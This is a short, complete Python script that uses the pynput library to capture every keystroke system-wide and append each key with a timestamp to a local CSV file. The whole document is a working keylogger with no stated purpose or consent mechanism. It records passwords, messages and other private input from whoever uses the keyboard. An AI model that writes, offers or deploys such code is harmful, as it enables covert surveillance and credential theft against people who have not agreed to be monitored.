import csv
from pynput import keyboard
from datetime import datetime
import os

log_file = "keystrokes.csv"

# Create the CSV file with headers if it doesn't exist or is empty
if not os.path.exists(log_file) or os.stat(log_file).st_size == 0:
    with open(log_file, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["Timestamp", "Key"])

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    with open(log_file, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, key_str])

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()